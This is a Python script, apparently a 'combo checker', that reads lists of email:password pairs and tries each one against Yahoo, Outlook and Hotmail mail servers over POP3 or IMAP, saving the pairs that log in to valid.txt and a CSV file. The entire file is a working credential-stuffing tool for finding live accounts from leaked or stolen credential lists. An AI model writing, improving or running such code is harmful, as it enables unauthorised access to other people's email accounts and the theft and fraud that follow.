import os
os.chdir('/home/raki/wd/repos/checkers/mails/')
import re
import poplib
import imaplib
import timeoutexc

class MailBox():
        
    def __init__(self, user, pwd):
        domain = re.search('@[\w.]+', user)
        if domain.group() == '@yahoo.com':
            self.__server = 'pop.mail.yahoo.com'
            self.__port = 995
        elif domain.group() == '@outlook.com':
            self.__server = 'outlook.office365.com'
            self.__port = 995
        elif domain.group() == '@hotmail.com':
            self.__server = 'outlook.office365.com'
            self.__port = 993
        self.__ssl = True
        self.__user = user
        self.__pwd = pwd
            
    def login(self, timeout):
        try:
            with timeoutexc.time_limit(timeout):
                if self.__port == 995:
                    print('Connecting POP3 with: ', self.__server, self.__user, self.__pwd)
                    self.__box = poplib.POP3_SSL(self.__server, port=self.__port)
                    res1 = self.__box.user(self.__user)
                    string1 = str(res1)
                    print('User identification result:', string1)
                    res2 = self.__box.pass_(self.__pwd)
                    string2 = str(res2)
                    print('Pass identification result:', string2)
                elif self.__port == 993:
                    print('Connecting IMAP with: ', self.__server, self.__user, self.__pwd)
                    self.__box = imaplib.IMAP4_SSL(self.__server)
                    res1 = self.__box.login(self.__user, self.__pwd)
                    string1 = str(res1)
                    print('Identification result:', string1)
        except timeoutexc.TimeoutException:
            print('\tTimed out!\n')
            return False
        except:
            print('\tLogin failed...\n')
            return False
        else:
            print('\tSuccessfully logged in!\n')
            return True
        
    def logout(self):
        if self.__port == 995:
            self.__box.quit()
        elif self.__port == 993:
            self.__box.logout()

def combo_extract(filenames):
    combos = {}
    for file in filenames:
        combos[file] = {}
        with open('txt/'+file) as fh:
            for line in fh:
                combo = line.strip().split(':')
                if len(combo) == 2:
                    combos[file][combo[0]] = combo[1]
                elif len(combo) == 3:
                    combos[file][combo[0]] = combo[2]
    #print(json.dumps(combos, indent=2))
    return combos

def check_combos(filenames, combos, save=False):
    results = {}
    for file in filenames:
        cpt_succ = 0
        cpt_fail = 0
        for user, pwd in combos[file].items():
            mail = MailBox(user, pwd)
            if mail.login(20):
                cpt_succ = cpt_succ + 1
                if save:
                    with open('txt/valid.txt', 'a') as tf:
                        tf.write(user+':'+pwd+'\n')
                mail.logout()
            else:
                cpt_fail = cpt_fail + 1
                if save:
                    with open('txt/invalid.txt', 'a') as tf:
                        tf.write(user+':'+pwd+'\n')
        results[file] = str(cpt_succ)+"/"+str(cpt_succ+cpt_fail)
    
    for file, result in results.items():
        print(file,':',result)
        
def valid():
    c = 0
    with open('txt/valid.txt') as fh:
        for line in fh:
            print(line, end='')
            c = c + 1
    return c
            
def valid_to_csv():
    combos = {}
    print('Saving valid combos to csv...')
    with open('txt/valid.txt') as fh:
        for line in fh:
            combo = line.strip().split(':')
            combos[combo[0]] = combo[1]
    with open('csv/valid.csv', 'w') as f:
        for key in combos.keys():
            f.write("%s,%s\n"%(key,combos[key]))
    print('Saved!')